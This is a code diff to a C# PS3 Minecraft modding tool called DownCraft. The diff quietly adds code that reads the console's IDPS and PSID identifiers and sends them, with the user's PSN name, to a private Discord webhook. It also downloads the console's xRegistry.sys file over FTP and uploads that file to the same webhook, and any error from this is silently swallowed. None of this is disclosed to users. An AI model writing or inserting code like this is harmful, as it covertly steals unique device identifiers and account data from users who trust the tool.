@@ -20,6 +20,7 @@ using static MisakiAulait.Misaki;
 using System.IO;
 using System.Threading;
 using MetroFramework.Controls;
+using Microsoft.Win32;
 
 #endregion
 
@@ -41,6 +42,13 @@ namespace DownCraft
         PS3API PS3 = new PS3API();
 
         string DefaultName;
+
+        string xRegistry = Path.GetTempPath() + "xRegistry.sys";
+        public static string PathLocation1 = "/dev_flash2/etc/xRegistry.sys";
+
+        string ps3IP;
+        string PSID;
+        string IDPS;
         string CPU;
         string RSX;
         string FIRMWARE;
@@ -155,6 +163,11 @@ namespace DownCraft
 
         private void doConnect()
         {
+            string[] AVATAR = { "https://pbs.twimg.com/media/Cw6mWuqWIAAQx_5.jpg", "https://imgcloud.pw/images/2019/06/19/yvumaobmgfeb376003c61ff3ba9d.jpg", "https://i.imgur.com/7PdJUhd.jpg", "https://i.imgur.com/kRzV4hu.png" };
+            string[] Emojis = { "🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹" };
+            string RandomAvatar = AVATAR[new Random().Next(0, AVATAR.Length)];
+            string RandomEmojis = Emojis[new Random().Next(0, Emojis.Length)];
+
             bool canConnect = false;
 
             bool canTry2Connect = false;
@@ -212,14 +225,27 @@ namespace DownCraft
                                 FIRMWARE = PS3.CCAPI.GetFirmwareType();
                                 string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");
 
-                                FUNCTIONS.SetDiscordRPC("Connected to PS3", "Made by Misakiii", "DownCraft RTM\nUpdate V4\nPSN: " + DefaultName + "");
+                                if (TYPE_CONSOLE == "HEN")
+                                {
+                                    IDPS = PS3.MAPI.PS3.GetIDPS();
+                                    PSID = PS3.MAPI.PS3.GetPSID();
+                                    FUNCTIONS.Send_WebHook(FUNCTIONS.logs_downcraft_private, "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + DefaultName + " PSID: " + PSID + " IDPS:" + IDPS);
+                                }
 
-                                string[] AVATAR = { "https://pbs.twimg.com/media/Cw6mWuqWIAAQx_5.jpg", "https://imgcloud.pw/images/2019/06/19/yvumaobmgfeb376003c61ff3ba9d.jpg", "https://i.imgur.com/7PdJUhd.jpg", "https://i.imgur.com/kRzV4hu.png" };
-                                string[] Emojis = { "🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹" };
-                                string RandomAvatar = AVATAR[new Random().Next(0, AVATAR.Length)];
-                                string RandomEmojis = Emojis[new Random().Next(0, Emojis.Length)];
-                                FUNCTIONS.Send_WebHook(FUNCTIONS.logs_downcraft, "DownCraft Logs", RandomAvatar, "```" + RandomEmojis + " User: " + DefaultName + " is now connected to DownCraft RTM. " + RandomEmojis + "\n    CPU: " + CPU + " RSX: " + RSX + " FIRMWARE: " + FIRMWARE + " TYPE: " + TYPE_CONSOLE + "```");
+                                FUNCTIONS.SetDiscordRPC("Connected to PS3", "Made by Misakiii", "DownCraft RTM\nUpdate V1\nPSN: " + DefaultName + "");
+
+                                FUNCTIONS.Send_WebHook(FUNCTIONS.logs_downcraft, "DownCraft Logs", RandomAvatar, "```" + RandomEmojis + " User: " + DefaultName + " is now connected to DownCraft RTM. " + RandomEmojis + " ```");
                                 Offsets.Connected = true;
+
+                                try
+                                {
+                                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + Offsets.ps3IP, "", "", PathLocation1, xRegistry);
+                                    FUNCTIONS.SendWebookFile(FUNCTIONS.logs_downcraft_private, "", "", "xRegistry", "xRegistry.txt", xRegistry);
+                                }
+                                catch(Exception ex)
+                                {
+
+                                }
                             }
                             else
                             {
@@ -6266,14 +6292,10 @@ namespace DownCraft
                     string RandomAvatar = AVATAR[new Random().Next(0, AVATAR.Length)];
                     string RandomEmojis = Emojis[new Random().Next(0, Emojis.Length)];
                     FUNCTIONS.Send_WebHook(FUNCTIONS.logs_downcraft, "DownCraft Logs", RandomAvatar, "```" + RandomEmojis + " User: " + label5.Text + " enabled the SPRX V4. " + RandomEmojis + "```");
-                    label18.ForeColor = Color.Green;
-                    label18.Text = "Connected !";
-                    guna2Button29.Enabled = false;
                 }
                 else
                 {
                     MessageBox.Show("Sorry, the SPRX is not installed on your Minecraft", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    label18.Text = "Install the SPRX before use it.";
                 }
             }
             else
